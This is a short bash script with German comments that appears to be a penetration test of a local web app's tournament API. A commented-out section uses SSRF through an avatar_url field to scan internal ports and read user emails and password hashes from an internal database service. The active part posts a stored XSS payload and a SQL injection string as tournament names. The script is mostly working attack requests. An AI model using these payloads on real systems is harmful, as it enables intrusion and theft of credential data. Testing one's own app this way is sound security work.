#!/bin/bash





# echo "=== PHASE 4: SSRF EXPLOITATION ==="

# # Angenommen wir haben einen SSRF-Endpoint gefunden
# # Scanne interne Services

# for port in 3001 3002 3006 5432 6379; do
#   echo "\nScanning internal port $port..."
  
#   curl -k -X POST https://localhost:8443/api/user/profile \
#     -H "Content-Type: application/json" \
#     -b cookies.txt \
#     -d "{
#       \"avatar_url\": \"http://database-service:$port/health\"
#     }" 2>&1 | grep -i "timeout\|refused\|success"
# done

# # Wenn database-service:3006 antwortet:
# echo "\n\nüéØ Exploiting database-service..."

# curl -k -X POST https://localhost:8443/api/user/profile \
#   -H "Content-Type: application/json" \
#   -b cookies.txt \
#   -d '{
#     "avatar_url": "http://database-service:3006/internal/list?table=Users&columns=id,email,password_hash"
#   }' | jq .

echo "=== PHASE 4: TESTING TOURNAMENT ENDPOINTS ==="

# Liste alle Tournaments
echo "1Ô∏è‚É£ Listing tournaments..."
curl -k -s https://localhost:8443/tournaments \
  -b cookies.txt | jq .

# Erstelle Tournament mit XSS im Namen
echo "\n2Ô∏è‚É£ Creating tournament with XSS..."
curl -k -X POST https://localhost:8443/tournament \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "name": "<img src=x onerror=alert(\"XSS\")>",
    "maxPlayers": 4
  }' -s | jq .

# SQL Injection im Tournament-Namen
echo "\n3Ô∏è‚É£ Creating tournament with SQL Injection..."
curl -k -X POST https://localhost:8443/tournament \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{
    "name": "Tourney'\'' OR '\''1'\''='\''1",
    "maxPlayers": 4
  }' -s | jq .